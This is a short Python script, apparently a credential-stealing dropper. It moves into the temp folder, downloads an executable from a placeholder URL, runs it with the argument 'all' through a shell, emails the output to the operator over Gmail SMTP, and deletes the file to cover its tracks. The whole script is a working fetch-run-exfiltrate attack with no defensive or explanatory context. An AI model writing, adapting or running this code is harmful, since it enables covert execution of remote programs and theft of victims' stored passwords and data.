import requests
import subprocess
import smtplib
import os
import tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    get_reponse = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_reponse.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)     

download("Put the URL")
result = subprocess.check_output("file name.exe all", shell=True)
send_mail("your email", "your password", result)
os.remove("file name.exe")